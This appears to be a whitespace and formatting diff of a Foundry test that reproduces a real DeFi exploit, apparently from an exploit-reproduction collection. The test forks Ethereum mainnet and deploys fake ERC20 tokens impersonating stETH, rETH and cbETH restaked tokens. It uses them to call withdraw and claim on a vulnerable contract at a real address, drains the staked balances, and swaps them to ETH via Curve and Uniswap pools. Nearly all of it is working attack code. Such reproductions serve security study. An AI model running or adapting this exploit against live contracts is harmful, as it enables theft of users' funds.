@@ -20,10 +20,12 @@ contract MyERC20 {
     uint8 public decimals = 18;
     address public stakedTokenAddr;
     uint256 public scaledBalanceToBal;
-    constructor(address _stakedTokenAddress,uint256 bal)public{
+
+    constructor(address _stakedTokenAddress, uint256 bal) public {
         stakedTokenAddr = _stakedTokenAddress;
         scaledBalanceToBal = bal;
     }
+
     event Transfer(address indexed from, address indexed to, uint256 value);
     event Approval(address indexed owner, address indexed spender, uint256 value);
 
@@ -47,26 +49,31 @@ contract MyERC20 {
         emit Transfer(address(0), msg.sender, amount);
     }
 
-    function burn(address sender,uint256 amount) external {
+    function burn(address sender, uint256 amount) external {
         balanceOf[sender] -= amount;
         totalSupply -= amount;
         emit Transfer(sender, address(0), amount);
     }
-    function scaledBalanceOf(address user)external pure returns(uint){
+
+    function scaledBalanceOf(address user) external pure returns (uint256) {
         return 0;
     }
-    function stakedTokenAddress()external returns(address){
+
+    function stakedTokenAddress() external returns (address) {
         return stakedTokenAddr;
     }
-    function scaledBalanceToBalance(uint256 a)external returns(uint){
+
+    function scaledBalanceToBalance(uint256 a) external returns (uint256) {
         return scaledBalanceToBal;
     }
 }
-interface Vulnerable{
+
+interface Vulnerable {
     function withdraw(address _restakedTokenAddress, uint256 amount) external;
     function claim(uint256 withdrawerIndex) external;
 }
-interface IuniswapV3{
+
+interface IuniswapV3 {
     function token0() external view returns (address);
     function token1() external view returns (address);
     function swap(
@@ -78,7 +85,6 @@ interface IuniswapV3{
     ) external;
 }
 
-
 contract ASTTest is Test {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
     Vulnerable vulnerable = Vulnerable(0xbAa87546cF87b5De1b0b52353A86792D40b8BA70);
@@ -89,45 +95,46 @@ contract ASTTest is Test {
     IuniswapV3 rETHPool = IuniswapV3(0xa4e0faA58465A2D369aa21B3e42d43374c6F9613);
     IuniswapV3 cbETHPool = IuniswapV3(0x840DEEef2f115Cf50DA625F7368C24af6fE74410);
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+
     function setUp() public {
         cheats.createSelectFork("https://rpc.ankr.com/eth", 18_448_167);
     }
-    function testExpolit()public{
+
+    function testExpolit() public {
         address[] memory stakedTokens = new address[](3);
         stakedTokens[0] = address(stETH);
         stakedTokens[1] = address(rETH);
         stakedTokens[2] = address(cbETH);
         deal(address(this), 0);
-        uint[] memory balances = new uint[](3);
+        uint256[] memory balances = new uint[](3);
         emit log_named_decimal_uint("Attacker Eth balance before attack:", address(this).balance, 18);
-        for(uint8 i = 0; i < stakedTokens.length; i++){
-            uint staked_bal = IERC20(stakedTokens[i]).balanceOf(address(vulnerable));
+        for (uint8 i = 0; i < stakedTokens.length; i++) {
+            uint256 staked_bal = IERC20(stakedTokens[i]).balanceOf(address(vulnerable));
             balances[i] = staked_bal;
             MyERC20 fake_token = new MyERC20(stakedTokens[i],staked_bal);
             fake_token.mint(10_000 * 1e18);
-            fake_token.approve(address(vulnerable),type(uint).max);
+            fake_token.approve(address(vulnerable), type(uint256).max);
 
             vulnerable.withdraw(address(fake_token), staked_bal);
             vulnerable.claim(i);
-
         }
 
         //changing stETH to eth
-        stETH.approve(address(LidoCurvePool),balances[0]);
-        LidoCurvePool.exchange(1,0,balances[0],0);
+        stETH.approve(address(LidoCurvePool), balances[0]);
+        LidoCurvePool.exchange(1, 0, balances[0], 0);
 
         //changing rETH to weth
-        rETH.approve(address(rETHPool),balances[1]);
-        rETHPool.swap(address(this),true,int256(balances[1]),4_295_128_740,new bytes(0));
+        rETH.approve(address(rETHPool), balances[1]);
+        rETHPool.swap(address(this), true, int256(balances[1]), 4_295_128_740, new bytes(0));
 
         //changing cbETH to weth
-        cbETH.approve(address(cbETHPool),balances[2]);
-        cbETHPool.swap(address(this),true,int256(balances[2]),4_295_128_740,new bytes(0));
+        cbETH.approve(address(cbETHPool), balances[2]);
+        cbETHPool.swap(address(this), true, int256(balances[2]), 4_295_128_740, new bytes(0));
 
         WETH.withdraw(WETH.balanceOf(address(this)));
         emit log_named_decimal_uint("Attacker Eth balance after attack:", address(this).balance, 18);
-
     }
+
     function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
         if (amount0Delta > 0) {
             IERC20(IuniswapV3(msg.sender).token0()).transfer(msg.sender, uint256(amount0Delta));
@@ -135,5 +142,6 @@ contract ASTTest is Test {
             IERC20(IuniswapV3(msg.sender).token1()).transfer(msg.sender, uint256(amount1Delta));
         }
     }
-    receive()external payable{}
+
+    receive() external payable {}
 }
